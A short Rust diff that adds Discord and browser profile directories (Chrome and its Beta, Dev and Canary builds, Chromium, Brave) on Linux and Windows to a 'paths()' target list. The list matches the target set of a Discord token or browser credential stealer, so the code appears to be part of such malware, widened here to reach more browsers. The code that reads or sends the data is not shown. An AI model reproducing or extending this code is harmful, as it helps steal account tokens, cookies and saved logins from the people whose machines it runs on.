@@ -17,7 +17,13 @@ fn paths() -> Vec<String> {
 
     let mut paths = vec![];
 
+    paths.push(format!("{}/discord", config_path)); // Discord
+    paths.push(format!("{}/google-chrome/Default", config_path)); // Google Chrome
+    paths.push(format!("{}/google-chrome-beta/Default", config_path)); // Google Chrome Beta
+    paths.push(format!("{}/google-chrome-unstable/Default", config_path)); // Google Chrome Dev
+    paths.push(format!("{}/chromium/Default", config_path)); // Chromium
     paths.push(format!("{}/vivaldi/Default", config_path)); // Vivaldi
+    paths.push(format!("{}/BraveSoftware", config_path)); // Brave
 
     paths
         .iter()
@@ -36,6 +42,10 @@ fn paths() -> Vec<String> {
     paths.push(format!("{}\\discordptb", roaming)); // Discord PTB
     paths.push(format!("{}\\Opera Software\\Opera Stable'", roaming)); // Opera
     paths.push(format!("{}\\Google\\Chrome\\User Data\\Default", local)); // Google Chrome
+    paths.push(format!("{}\\Google\\Chrome Beta\\User Data\\Default", local)); // Google Chrome Beta
+    paths.push(format!("{}\\Google\\Chrome SxS\\User Data\\Default", local)); // Google Chrome Canary
+    paths.push(format!("{}\\Chromium\\User Data\\Default", local)); // Chromium
+
     paths.push(format!(
         "{}\\BraveSoftware\\Brave-Browser\\User Data\\Default",
         local
